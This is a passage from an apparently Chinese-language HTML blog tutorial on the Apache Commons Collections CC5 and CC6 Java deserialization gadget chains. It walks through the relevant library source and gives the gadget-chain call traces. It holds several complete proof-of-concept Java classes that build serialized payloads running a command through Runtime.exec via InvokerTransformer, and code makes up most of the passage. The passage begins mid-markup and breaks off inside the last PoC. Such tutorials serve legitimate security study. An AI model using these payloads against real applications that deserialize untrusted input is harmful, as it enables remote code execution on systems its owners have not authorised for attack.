class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">       ObjectInputStream.readObject()</span><br><span class="line">           BadAttributeValueExpException.readObject()</span><br><span class="line">               TiedMapEntry.toString()</span><br><span class="line">                   LazyMap.get()</span><br><span class="line">                       ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Class.getMethod()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.getRuntime()</span><br><span class="line">                           InvokerTransformer.transform()</span><br><span class="line">                               Method.invoke()</span><br><span class="line">                                   Runtime.exec()</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="function">            InvocationTargetException, InstantiationException, IOException, NoSuchFieldException </span>&#123;</span><br><span class="line">        Transformer[] realPoc  = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123; ("calc")&#125;)&#125;;</span><br><span class="line">        ChainedTransformer fakeChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="string">"random"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="keyword">new</span> TiedMapEntry(mapDemo, <span class="string">"random"</span>);</span><br><span class="line">        BadAttributeValueExpException finaldemo = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"random"</span>);</span><br><span class="line">        Field valDemo = Class.forName(<span class="string">"javax.management.BadAttributeValueExpException"</span>).getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valDemo.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valDemo.set(finaldemo, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(finaldemo);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在cc5中用到的是TiedMapEntry中的toString方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进getValue方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这里对this.map调用了get方法，并将key传递进去，所以这里只需要令map为我们前面构造好的LazyMap，即可触发rce。其中map和key是可控的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.map = map;</span><br><span class="line">    <span class="keyword">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们需要找哪里调用了toString方法，在cc5中使用了BadAttributeValueExpException这个类。        valObj从Filed中取出来的，通过反射来设置BadAttributeValueExpException中val的值为TiedMapEntry即可触发命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">       Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">           val = <span class="keyword">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();<span class="comment">//调用点</span></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>为什么创建BadAttributeValueExpException实例时不直接将构造好的TiedMapEntry传进去而要通过反射来修改val的值？<br>以下为BadAttributeValueExpException的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现，如果我们直接将前面构造好的TiedMapEntry传进去，在这里就会触发toString，从而导致rce。此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry。否则就会报出错误。  </p><h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><p>CC6 特点：适用范围广，受 JDK 版本影响最小     </p><p>poc1  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException</span></span><br><span class="line"><span class="function">            , InstantiationException, IOException, NoSuchFieldException </span>&#123;</span><br><span class="line">        Transformer[] realPoc  = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123; ("calc")&#125;)&#125;;</span><br><span class="line">        ChainedTransformer fakeChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="string">"random"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, fakeChain);</span><br><span class="line">        TiedMapEntry rceDemo = <span class="keyword">new</span> TiedMapEntry(mapDemo, <span class="string">"random"</span>);</span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, rceDemo);</span><br><span class="line"></span><br><span class="line">        Field cf = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        cf.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        cf.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">       java.util.HashSet.readObject()</span><br><span class="line">           java.util.HashMap.put()</span><br><span class="line">           java.util.HashMap.hash()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                   org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                       org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                       org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                       java.lang.reflect.Method.invoke()</span><br><span class="line">                           java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>CC6 其实跟 CC5 是在 TiedMapEntry#getValue 延伸出来并行的两条链  </p><p>回顾我们通过 TiedMapEntry#getValue 而进行 RCE 的 demo   </p><p>回顾 TiedMapEntry 里面的方法，CC5 用的是 TiedMapEntry#toString，里面调用了getValue， 那么其实在 TiedMapEntry 还有 hashCode 跟 equals 同样调用了 getValue,cc6中使用hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Entry)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Entry other = (Entry)obj;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.key == <span class="keyword">null</span> ? other.getKey() == <span class="keyword">null</span> : <span class="keyword">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="keyword">null</span> ? other.getValue() == <span class="keyword">null</span> : value.equals(other.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就需要找哪里触发了hashCode，cc6中使用的是HashMap#hash </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key目前还不是我们可控的，所以需要找某个点调用了hash方法，并且传递的参数是我们可控的，这里用到了HashMap#put</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>key还是不是我们可控的，所以还需要找某个点调用了put方法，并且传递的第一个参数是我们可控的，最后找到了HashSet#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"> ……</span><br><span class="line">       <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">           <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">               E e = (E) s.readObject();</span><br><span class="line">           map.put(e, PRESENT);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>poc2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ComCol4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, new Object[] &#123; "getRuntime",</span><br><span class="line">                        <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123; Object<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line">                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new String[] &#123; "calc" &#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry tme = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">"keykey"</span>);</span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        expMap.put(tme, <span class="string">"valuevalue"</span>);</span><br><span class="line">        outerMap.remove(<span class="string">"keykey"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span 